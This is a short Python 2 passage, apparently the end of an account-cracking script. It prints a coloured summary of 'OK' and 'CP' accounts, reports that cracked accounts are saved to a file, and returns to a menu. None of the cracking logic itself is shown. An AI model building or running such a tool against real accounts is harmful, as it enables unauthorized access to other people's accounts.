    print '\n\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Process Has Been Completed ...'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Total \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP\x1b[1;97m : ' + str(len(oks)) + '/' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Cracking Accounts Has Been Saved : avsid/cfbid.txt'
    raw_input('\n\x1b[1;97mPress Enter Go Back To Menu')
    menu()


if __name__ == '__main__':
    masuk()